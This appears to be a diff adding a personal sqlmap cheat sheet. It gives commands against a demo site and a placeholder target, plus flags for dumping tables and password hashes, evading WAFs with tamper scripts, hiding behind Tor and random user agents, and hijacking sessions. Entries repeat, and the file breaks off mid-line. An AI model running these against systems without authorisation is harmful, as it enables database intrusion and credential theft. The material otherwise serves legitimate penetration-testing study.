@@ -1,0 +1,98 @@
+cd %USERPROFILE%\Desktop\sqlmap
+ run sql map on python windows 11:python3 sqlmap.py sql map commands:SQL command help: sqlmap.py -h
+command:python sqlmap.py -u "http://testfire.net/login.jsp" --data="uid=admin&pass=admin" --batch --risk=3 --level=5 --dbs
+commmand:# Basic test
+python sqlmap.py -u "http://target.com/page.php?id=1" --batch
+-------------------------------------------------------------
+--current-user         # Show DB username
+--current-db           # Show current database
+--is-dba               # Check if user is DBA
+--hostname             # Get database server hostname
+--users                # List all database users
+--roles                # List DB roles (if supported)
+--privileges           # Show user privileges
+--------------------------------------------------------------
+--dbs                  # List all databases
+-D <db> --tables       # List tables in specific database
+-D <db> -T <table> --columns   # List columns in a table
+--------------------------------------------------------------
+--sql-query "SELECT username, password FROM users"  # Run custom query
+--------------------------------------------------------------
+--technique=BEUSTQ     # Use specific techniques (B: boolean, E: error, U: union, etc.)
+--level=5              # Increase depth of testing
+--risk=3               # Increase risk (for deeper testing)
+---------------------------------------------------------------
+--banner               # Show DBMS banner info
+--fingerprint          # Try to fingerprint the DBMS
+--tamper=<script>      # Use tamper scripts (for WAF evasion)
+--threads=5            # Speed up with multiple threads
+----------------------------------------------------------------
+--data="uid=admin&pass=admin"            # POST request data
+--cookie="PHPSESSID=123abc"             # Send session cookies
+----------------------------------------------------------------
+--current-db           # Show current DB in use
+--current-user         # Show the current DB user
+--is-dba               # Check if current user is a DBA
+--hostname             # Show the DBMS hostname
+--banner               # Show the DBMS banner
+--proxy=<proxy>        # Use proxy (for anonymity)
+--tor                  # Use Tor for anonymizing traffic
+--tamper=<script>      # Use tamper scripts to evade WAFs (e.g., charencode, space2comment)
+--flush-session        # Clear previous session data
+--no-cast              # Disable casting of values
+--no-escape            # Disable escaping of characters in SQL queries
+--------------------------------------------------------------------
+--dbs                  # List all databases
+-D <db> --tables       # List all tables in a database
+-D <db> -T <table> --columns  # List columns in a table
+-D <db> -T <table> --dump  # Dump all rows from a table
+-D <db> -T <table> -C <col1>,<col2> --dump  # Dump specific columns from a table
+--passwords            # List all database passwords (if available)
+--users                # List database users
+--roles                # List database roles
+--privileges           # Show user privileges
+--version              # Show the DBMS version
+--------------------------------------------------------------------
+--current-db           # Show current DB in use
+--current-user         # Show the current DB user
+--is-dba               # Check if current user is a DBA
+--hostname             # Show the DBMS hostname
+--banner               # Show the DBMS banner
+--proxy=<proxy>        # Use proxy (for anonymity)
+--tor                  # Use Tor for anonymizing traffic
+--tamper=<script>      # Use tamper scripts to evade WAFs (e.g., charencode, space2comment)
+--flush-session        # Clear previous session data
+--no-cast              # Disable casting of values
+--no-escape            # Disable escaping of characters in SQL queries
+-----------------------------------------------------------------------
+--technique=BEUSTQ     # Use specific injection techniques (B: boolean, E: error, U: union, etc.)
+--level=<level>        # Increase the level of testing (higher = more intrusive)
+--risk=<risk>          # Increase the risk of testing (higher = more tests)
+--sql-query "<query>"   # Run a custom SQL query
+--union-cols           # Specify the number of columns for union-based injection
+--union-char           # Specify the character for the UNION query
+--crawl                # Crawl the target for injectable parameters
+--random-agent         # Use a random User-Agent to avoid detection
+------------------------------------------------------------------------
+--output-dir=<dir>     # Specify directory for saving output
+--save=<file>          # Save results to a specific file
+--report=<file>        # Generate a report of the findings
+--flush-session        # Remove session file before starting a new attack
+-------------------------------------------------------------------------
+--batch                # Automatically answer prompts
+--tor                  # Use Tor for anonymity
+--timeout              # Set a custom timeout
+--threads             # Adjust number of threads
+--no-validate         # Skip testing for parameters
+--exclude-sysdbs      # Exclude system databases
+-------------------------------------------------------------------------
+--tamper=charencode    # Encode characters to bypass WAF (e.g., converting characters to hex)
+--tamper=space2comment # Replace spaces with comments (to evade detection)
+--tamper=randomcase   # Change case of SQL keywords to evade filters
+--tamper=between      # Insert random content between SQL keywords to avoid detection
+--tamper=unionalltodb  # Use `UNION ALL` to bypass filters
+--------------------------------------------------------------------------
+--auth-type=<type>     # Set authentication type (Basic, Digest, etc.)
+--auth-cred=<cred>     # Provide authentication credentials
+--cookie=<cookie>      # Send a custom cookie (for session hijacking or testing)
+--data="username=admin&password=admin"  # POST data (use for login forms
